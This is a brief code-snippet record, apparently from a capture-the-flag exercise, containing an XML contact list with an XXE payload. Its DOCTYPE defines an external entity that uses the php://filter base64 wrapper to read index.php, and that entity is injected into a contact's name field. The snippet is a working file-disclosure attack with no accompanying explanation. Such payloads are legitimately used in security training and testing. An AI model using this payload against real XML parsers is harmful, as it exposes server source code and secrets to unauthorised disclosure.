---
id: fcd33766-beec-4179-95a6-a989659990af
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.188242+00:00'
updated_at: '2023-04-10T20:24:40.762805+00:00'
---

# Code Snippet fcd33766

**Language**: xml

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```
